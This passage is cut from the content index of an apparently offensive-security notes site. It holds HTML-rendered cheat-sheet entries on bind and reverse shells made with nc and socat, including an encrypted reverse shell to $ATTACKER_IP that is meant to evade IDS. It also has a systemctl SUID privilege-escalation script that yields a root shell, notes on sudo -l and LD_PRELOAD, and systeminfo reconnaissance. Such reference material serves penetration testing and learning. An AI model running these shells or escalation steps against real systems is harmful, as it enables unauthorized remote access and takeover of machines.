data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Bind shell (target)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -lnp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /bin/bash&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;socat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; TCP-LISTEN:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; EXEC:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/bash -li&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;socat gets us an interactive login shell right out the gate, though we’re still vulnerable to &lt;code&gt;Ctrl+C&lt;/code&gt;. Note that when binding to PowerShell, use &lt;code&gt;powershell.exe,pipes&lt;/code&gt; in order to force PowerShell to use UNIX-style STDIN/STDOUT.&lt;/p&gt;\n&lt;h2 id=&quot;encrypted-shells&quot;&gt;Encrypted shells&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#encrypted-shells&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;socat can make encrypted connections, which foil after-the-fact network analysis and may circumvent IDS entirely.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Generate a self-signed certificate.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; req&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --newkey&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; rsa:2048&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -nodes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;            -keyout&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; shell.key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -x509&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -days&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 362&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;            -out&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; shell.crt&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create a PEM file combining the certificate and key.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; shell.key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; shell.crt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; shell.pem&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Start a listener.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;socat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; OPENSSL-LISTEN:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,cert=shell.pem,verify=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; -&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Start the reverse shell on the target.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;socat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; OPENSSL:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,verify=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; EXEC:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/bash -li&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The &lt;code&gt;verify=0&lt;/code&gt; directive turns off certificate validation, so this isn’t a “secure” connection in the sense that it’s been &lt;em&gt;authenticated&lt;/em&gt;, but it is secure in the sense that it’s &lt;em&gt;encrypted&lt;/em&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;shell-stabilization&quot;&gt;Shell “stabilization”&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#shell-stabilization&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Automatically-stabilize-a-reverse-shell-with-socat&quot; data-block=&quot;&quot; data-embed-alias=&quot;Automatically stabilize a reverse shell with socat&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Automatically-stabilize-a-reverse-shell-with-socat&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Automatically-stabilize-a-reverse-shell-with-socat&quot;&gt;Transclude of Automatically-stabilize-a-reverse-shell-with-socat&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/ss":{"slug":"spells/ss","filePath":"spells/ss.md","title":"ss","links":["spells/netstat","spells/TCP","spells/UDP"],"tags":["Application/ss","Application/netstat","Protocol/TCP","Protocol/UDP"],"content":"“Socket statistics” (ss) is a netstat-like tool with slightly nicer formatting. Options:\n\n-t — Display TCP sockets\n-u — Display UDP sockets\n-l — Display listening sockets (not just established connections)\n-p — Show the process using the socket (broken?)\n-n — Show raw port numbers (not named services)\n\nFor example, ss -tulpn will produce a nice list of open ports.","richContent":"&lt;p&gt;“Socket statistics” (ss) is a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netstat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netstat&quot;&gt;netstat&lt;/a&gt;-like tool with slightly nicer formatting. Options:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-t&lt;/code&gt; — Display &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; sockets&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; — Display &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; sockets&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; — Display listening sockets (not just established connections)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; — Show the process using the socket (broken?)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-n&lt;/code&gt; — Show raw port numbers (not named services)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;For example, &lt;code&gt;ss -tulpn&lt;/code&gt; will produce a nice list of open ports.&lt;/p&gt;"},"spells/sudo":{"slug":"spells/sudo","filePath":"spells/sudo.md","title":"sudo","links":["spells/Exploit-LD_PRELOAD","spells/Exploit-LD_LIBRARY_PATH"],"tags":["Application/sudo","AttackCycle/Exploitation"],"content":"The sudo -l command will helpfully tell us what we can run as the superuser without a password (NOPASSWD, useful for finding potential shell escapes), as well as what environment variables may be preserved (useful if you’re going to try to exploit LD_PRELOAD or LD_LIBRARY_PATH).\n\n\n                  \n                  Caution\n                  \n                \n\n\nThe use of sudo -l requires that the user have some level of sudo access to begin with, and will be logged!\n\n\n","richContent":"&lt;p&gt;The &lt;code&gt;sudo -l&lt;/code&gt; command will helpfully tell us what we can run as the superuser without a password (NOPASSWD, useful for finding potential shell escapes), as well as what environment variables may be preserved (useful if you’re going to try to exploit &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-LD_PRELOAD&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-LD_PRELOAD&quot;&gt;LD_PRELOAD&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-LD_LIBRARY_PATH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-LD_LIBRARY_PATH&quot;&gt;LD_LIBRARY_PATH&lt;/a&gt;).&lt;/p&gt;\n&lt;blockquote class=&quot;callout caution&quot; data-callout=&quot;caution&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Caution&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The use of &lt;code&gt;sudo -l&lt;/code&gt; requires that the user have &lt;em&gt;some&lt;/em&gt; level of sudo access to begin with, and &lt;em&gt;will&lt;/em&gt; be logged!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/systemctl":{"slug":"spells/systemctl","filePath":"spells/systemctl.md","title":"systemctl","links":["spells/sudo"],"tags":["Application/systemctl","AttackCycle/PrivEsc","Application/sudo"],"content":"If systemctl is SUID root, then a malicious service file can easily be abused to create a root shell.\nFILE=`mktemp -u`\n \ncat &gt; ${FILE}.service &lt;&lt; EOF\n[Service]\nType=oneshot\nExecStart=/bin/cp /bin/bash ${FILE}.sh\nExecStart=/bin/chmod +xs ${FILE}.sh\n \n[Install]\nWantedBy=multi-user.target\nEOF\n \nsystemctl link ${FILE}.service\nsystemctl start ${FILE}.service\n \n${FILE}.sh -p # Root!\nEven if systemctl is not SUID root, so long as you have NOPASSWD sudo access to it this trick will still work.","richContent":"&lt;p&gt;If &lt;a href=&quot;https://gtfobins.github.io/gtfobins/systemctl/#suid&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;systemctl is SUID root&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, then a malicious service file can easily be abused to create a root shell.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mktemp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.service&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x3C;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; EOF&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[Service]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Type=oneshot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ExecStart=/bin/cp /bin/bash &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ExecStart=/bin/chmod +xs &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[Install]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;WantedBy=multi-user.target&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;EOF&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;systemctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; link&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;systemctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; start&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.sh -p &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Root!&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Even if &lt;a href=&quot;https://gtfobins.github.io/gtfobins/systemctl/#sudo&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;systemctl is not SUID root&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, so long as you have NOPASSWD &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt; access to it this trick will still work.&lt;/p&gt;"},"spells/systeminfo":{"slug":"spells/systeminfo","filePath":"spells/systeminfo.md","title":"systeminfo","links":["spells/findstr"],"tags":["Application/systeminfo","OS/Windows","Application/findstr","OS/Windows/ActiveDirectory","AttackCycle/Reconnaissance"],"content":"The Windows systeminfo command displays a lot of information! Use findstr to filter its output:\nsysteminfo | findstr /B /C:&quot;OS Name&quot; `\n                        /C:&quot;OS Version&quot; `\n                        /C:&quot;System Type&quot;\nThis can be used to semi-reliably determine if a machine is part of a domain.\nsysteminfo | findstr Domain\n(Non-AD joined machines will almost always use WORKGROUP for the Domain, while AD-joined machines will often use a fully qualified DNS domain here.)","richContent":"&lt;p&gt;The Windows systeminfo command displays &lt;em&gt;a lot&lt;/em&gt; of information! Use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/findstr&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/findstr&quot;&gt;findstr&lt;/a&gt; to filter its output:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;systeminfo &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; findstr &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;B &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;C:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;OS Name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                        /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;C:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;OS Version&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                        /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;C:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;System Type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This can be used to semi-reliably determine if a machine is part of a domain.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;systeminfo &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; findstr 